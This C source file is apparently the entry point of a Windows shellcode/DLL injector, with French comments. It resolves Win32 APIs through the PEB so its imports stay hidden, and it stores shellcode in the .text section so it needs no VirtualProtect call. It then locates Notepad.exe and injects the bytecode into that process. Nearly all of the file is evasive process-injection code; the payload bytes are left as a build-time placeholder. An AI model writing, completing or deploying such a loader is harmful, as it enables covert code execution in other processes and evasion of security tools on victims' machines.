#include <dll-injector/main.h>
#include <utils/peb-lookup.h>
#include <utils/memory.h>

// shellcode array in the .text section with -Wl, --omagic to avoid the VirtualProtect call
DOT_TEXT 
static unsigned char bytecode[SET_BYTECODE_SIZE] = SET_BYTECODE_ARRAY;
static const int bytecode_size = SET_BYTECODE_SIZE;
static const char * targetProcess = "Notepad.exe";

/**
 * @brief Point d'entrée du programme d'injection.
 *
 * Initialise la résolution dynamique des API via le PEB, localise Notepad.exe
 * dans la liste des processus actifs, puis injecte la DLL spécifiée.
 *
 * @return 0 en cas de succès, 1 en cas d'erreur.
 */
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
  DWORD targetPid;
  HANDLE hProcess;
  LPVOID remoteBuffer;

  /* Initialisation obligatoire des API Win32 résolues dynamiquement via le PEB.
   * Aucun appel système Windows ne doit précéder cette opération. */
  DYNAMIC_APIS * api = InitDynamicAPIs();
  if(api == NULL){
    return 1;
  }

  targetPid = ProcessWalking("Notepad.exe");
  if(targetPid == 0){
    return 1;
  }

  remoteBuffer = NULL;
  hProcess = injectDll(targetPid, bytecode, bytecode_size, &remoteBuffer);
  if(hProcess == NULL){
    return 1;
  }

  mem_close_handle(hProcess);
  return 0;
}
